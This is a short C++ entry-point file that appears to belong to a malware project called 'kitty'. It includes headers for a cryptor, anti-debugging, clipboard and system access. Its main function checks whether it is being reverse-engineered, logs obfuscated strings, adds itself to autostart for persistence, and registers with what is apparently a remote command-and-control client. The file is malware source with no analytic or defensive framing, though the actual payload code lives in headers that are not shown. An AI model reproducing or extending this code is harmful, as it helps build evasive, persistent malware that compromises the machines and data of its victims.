#include <kitty/cryptor.h>
#include <kitty/nodebug.h>
#include <kitty/client.h>
#include <kitty/clipboard.h>
#include <kitty/system.h>
#include <kitty/log.h>
#include <iostream>
#include <thread>

int main()
{
	if (ShouldQuit())
		KittyLog(OBFUSCATED("Reversing detected"), false);

	AddToAutostart();

	KittyClient client = KittyClient();
	if (!client.Register())
		KittyLog(OBFUSCATED("Unable to register"), true);

	return 0;
}